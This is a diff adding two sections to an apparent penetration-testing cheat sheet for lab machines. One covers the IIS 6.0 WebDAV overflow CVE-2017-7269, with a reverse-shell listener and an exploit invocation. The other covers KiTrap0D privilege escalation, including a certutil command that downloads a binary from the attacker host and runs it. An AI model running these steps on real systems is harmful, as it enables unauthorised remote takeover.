@@ -238,6 +238,72 @@ Use **GodPotato** first — broadest compatibility.
 
 ---
 
+### IIS 6.0 ScStoragePathFromUrl -- CVE-2017-7269
+
+**Impact:** Unauthenticated RCE via WebDAV PROPFIND buffer overflow. IIS 6.0 / Windows Server 2003 only.
+
+> **One exploit window per box spawn.** IIS 6.0 Rapid Fail Protection can be configured as low
+> as one crash. After CVE-2017-7269 fires and crashes the DAV worker, the app pool enters
+> "stopped" state -- all subsequent PROPFIND requests return 400. Ensure your listener is up and
+> the payload is ready before firing. If the app pool is already stopped, you need a fresh spawn.
+
+```bash
+# Confirm the target: IIS 6.0 + WebDAV enabled
+curl -I http://$IP | grep Server            # Server: Microsoft-IIS/6.0
+nmap --script http-webdav-scan -p 80 $IP    # WebDAV header present?
+davtest -url http://$IP/                    # confirms WebDAV is live
+
+# Pre-flight: is the app pool still running? (400 on OPTIONS/PROPFIND = already stopped)
+curl -s -o /dev/null -w "%{http_code}" -X OPTIONS http://$IP/
+# 200 or 207 = OK to proceed; 400 = app pool already dead, get a fresh spawn
+
+# Set up handler BEFORE firing the exploit
+rlwrap nc -lvnp $LPORT
+
+# Exploit (ScStoragePathFromUrl PROPFIND overflow)
+# https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
+python2 iis6_exploit.py $IP 80 $LHOST $LPORT
+
+# PT ONLY (Metasploit):
+# use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+# set RHOSTS $IP; set LHOST $LHOST; run
+```
+
+> Shell lands as `NT AUTHORITY\NETWORK SERVICE`. Escalate with
+> [KiTrap0D / MS10-015](#kitrap0d----ms10-015-cve-2010-0232) -- the correct LPE on Win2003 SP2.
+> Token impersonation (Potato variants) does not reliably work from NETWORK SERVICE on Win2003 SP2.
+
+---
+
+### KiTrap0D -- MS10-015 (CVE-2010-0232)
+
+**Impact:** Any local user / NETWORK SERVICE -> SYSTEM via Windows kernel #GP fault handler flaw.
+**Affected:** Windows NT 3.5 -- Windows 7, Windows 2003 SP2 (32-bit only; check arch).
+
+> **Use this instead of Potato/churrasco on Win2003 SP2.** WMIC network-targeted calls
+> (`wmic /node:127.0.0.1`) and `ITaskScheduler::SetTargetComputer("\\127.0.0.1")` both fail
+> from `NETWORK SERVICE` on Win2003 SP2 -- the impersonated token is the same NETWORK SERVICE
+> account, not SYSTEM. Token impersonation attacks (churrasco, JuicyPotato, Rotten Potato) do
+> not reliably escalate from NETWORK SERVICE on Win2003. KiTrap0D works where Potatoes don't.
+
+```bash
+# Check: Win2003 SP2 + 32-bit
+systeminfo | findstr /i "os version\|system type"
+# OS Version:  5.2.3790 Service Pack 2 = Win2003 SP2
+# System Type: X86-based PC or x86 Family
+
+# KiTrap0D PoC (compiled x86 binary -- safe to build locally, run on target)
+# https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-015
+# Transfer to target:
+certutil.exe -urlcache -f http://$LHOST:8000/KiTrap0D.exe C:\Windows\Temp\kt.exe
+C:\Windows\Temp\kt.exe    # spawns cmd.exe as SYSTEM
+
+# Alternatively -- Metasploit post module
+# use post/windows/escalate/ms10_015_kitrap0d
+```
+
+---
+
 ## Quick Version Check Script (Linux)
 
 ```bash
